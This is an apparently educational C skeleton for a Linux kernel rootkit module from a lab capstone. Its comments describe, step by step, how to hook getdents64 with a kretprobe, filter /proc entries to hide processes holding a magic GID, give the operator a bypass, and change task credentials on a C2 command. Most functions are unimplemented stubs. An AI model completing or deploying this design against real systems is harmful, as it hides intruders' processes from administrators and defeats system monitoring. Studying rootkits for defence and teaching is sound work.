/*
 * proc_hide.c — Process hiding via getdents64 kretprobe on /proc
 *
 * Capstone: Kernel Rootkit + Exploitation
 *
 * Hooks __arm64_sys_getdents64 with a SEPARATE kretprobe (from file_hide.c)
 * to filter /proc directory entries. Processes whose GID is MAGIC_GID (1337)
 * are hidden from ps, top, htop, and any tool that reads /proc via getdents64.
 *
 * GID 1337 bypass: if the CALLING process has GID 1337 in its supplementary
 * groups, it sees everything — the operator maintains full visibility.
 *
 * How it works:
 *   1. Entry handler: check if fd's dentry is /proc, save dirp pointer
 *   2. Return handler: for each numeric dirent, look up task via
 *      find_task_by_vpid(), check if any group in cred->group_info
 *      is MAGIC_GID → memmove to remove entry
 *   3. C2 integration: CMD_ADD_GID sets a process's supplementary
 *      groups to include MAGIC_GID
 *
 * Reference: modules/prochide/prochide.c in the QEMU lab
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <asm/ptrace.h>

#include "rootkit.h"

#define MAX_BUF_SIZE (1 << 16)  /* 64 KiB max dirent buffer */

/* ─── Per-instance data ───────────────────────────────────────────────────── */

/*
 * TODO: Define struct proc_hide_data
 *
 * Fields:
 *   struct linux_dirent64 __user *dirp;   // userspace buffer pointer
 *   bool is_proc;                          // true if fd points to /proc
 */

/* ─── Helper: check if dirent name is a numeric PID ──────────────────────── */

/*
 * TODO: Implement is_pid_entry()
 *
 * Returns true if the name is purely numeric (every char is '0'-'9').
 * On success, sets *pid_out to the parsed value via kstrtoint().
 *
 * static bool is_pid_entry(const char *name, pid_t *pid_out)
 */

/* ─── Helper: check if a task has MAGIC_GID ──────────────────────────────── */

/*
 * TODO: Implement task_has_magic_gid()
 *
 * Check if the given task's credentials include MAGIC_GID.
 * This is used to decide whether to hide a /proc/<pid> entry.
 *
 * Steps:
 * 1. rcu_read_lock() to safely access task->cred
 * 2. Get cred via __task_cred(task)
 * 3. Check cred->gid == MAGIC_GID (primary group)
 * 4. Iterate cred->group_info->gid[] checking for MAGIC_GID
 * 5. rcu_read_unlock()
 * 6. Return true if found
 *
 * static bool task_has_magic_gid(struct task_struct *task)
 */

/* ─── Entry handler ───────────────────────────────────────────────────────── */

/*
 * TODO: Implement proc_hide_entry()
 *
 * Called BEFORE __arm64_sys_getdents64 runs.
 *
 * Steps:
 * 1. Save dirp from user_regs->regs[1] (same double pt_regs pattern)
 * 2. Determine if the fd points to /proc:
 *    - Get fd number from user_regs->regs[0]
 *    - Look up struct file via fget(fd)
 *    - Check file_dentry(f)->d_iname — if it's "proc", set is_proc = true
 *    - fput(f)
 * 3. Return 0
 *
 * Function signature:
 *   static int proc_hide_entry(struct kretprobe_instance *ri,
 *                              struct pt_regs *regs)
 */

/* ─── Return handler ──────────────────────────────────────────────────────── */

/*
 * TODO: Implement proc_hide_return()
 *
 * Called AFTER __arm64_sys_getdents64 returns.
 *
 * Steps:
 * 1. If !data->is_proc, return 0 immediately (not a /proc listing)
 * 2. Check caller magic GID: in_group_p(KGIDT_INIT(MAGIC_GID))
 *    — If true, skip filtering (operator sees everything)
 * 3. Get return value; if <= 0 or > MAX_BUF_SIZE, skip
 * 4. kmalloc + copy_from_user the dirent buffer
 * 5. Walk entries: for each numeric PID entry:
 *    a. find_task_by_vpid(pid) under rcu_read_lock
 *    b. If task exists and task_has_magic_gid(task):
 *       - If prev exists: extend prev->d_reclen to absorb current
 *       - Else: track removed_bytes for leading entries
 * 6. If leading entries removed, memmove and adjust total_len
 * 7. copy_to_user + update regs->regs[0]
 * 8. kfree
 *
 * Function signature:
 *   static int proc_hide_return(struct kretprobe_instance *ri,
 *                               struct pt_regs *regs)
 */

/* ─── Kretprobe definition ────────────────────────────────────────────────── */

/*
 * TODO: Define the kretprobe struct
 *
 * static struct kretprobe proc_krp = {
 *     .handler       = proc_hide_return,
 *     .entry_handler = proc_hide_entry,
 *     .data_size     = sizeof(struct proc_hide_data),
 *     .maxactive     = 20,
 *     .kp.symbol_name = "__arm64_sys_getdents64",
 * };
 *
 * NOTE: This is a separate kretprobe from the one in file_hide.c.
 * Both hook the same symbol — the kernel supports multiple kretprobes
 * on the same address.
 */

/* ─── State tracking ──────────────────────────────────────────────────────── */

static bool active;

/* ─── Public interface ────────────────────────────────────────────────────── */

/*
 * TODO: Implement proc_hide_init()
 *
 * 1. Register the kretprobe: register_kretprobe(&proc_krp)
 * 2. On success, set active = true and log with pr_info
 * 3. On failure, return the error code
 */
int proc_hide_init(void)
{
	/* TODO */
	return -ENOSYS;
}

/*
 * TODO: Implement proc_hide_exit()
 *
 * 1. If active, unregister the kretprobe
 * 2. Log nmissed count
 * 3. Set active = false
 */
void proc_hide_exit(void)
{
	/* TODO */
}

int proc_hide_enable(void)
{
	/* TODO */
	return -ENOSYS;
}

void proc_hide_disable(void)
{
	/* TODO */
}

bool proc_hide_is_active(void)
{
	return active;
}

/*
 * TODO: Implement proc_hide_add_pid()
 *
 * Add MAGIC_GID to a process's supplementary group list.
 * Called by C2 handler for CMD_ADD_GID.
 *
 * Steps:
 * 1. Find task: rcu_read_lock + find_task_by_vpid(pid) + get_task_struct
 * 2. Get current cred: prepare_creds() on the target? No — we override:
 *    a. Get current group_info from task->cred
 *    b. Allocate new group_info with one extra slot
 *    c. Copy existing groups + add KGIDT_INIT(MAGIC_GID)
 *    d. groups_sort() the new group_info
 *    e. Use override_creds pattern or direct rcu_assign_pointer
 *       on task->real_cred and task->cred
 *       WARNING: direct cred manipulation is inherently racy. This is
 *       acceptable for a rootkit but NOT for production code.
 * 3. put_task_struct
 * 4. Log and return 0
 *
 * HINT: Look at how set_groups() works in kernel/groups.c for the
 * proper way to swap group_info on a task's credentials.
 */
int proc_hide_add_pid(pid_t pid)
{
	/* TODO */
	pr_warn("rootkit: proc_hide_add_pid() not implemented yet\n");
	return -ENOSYS;
}
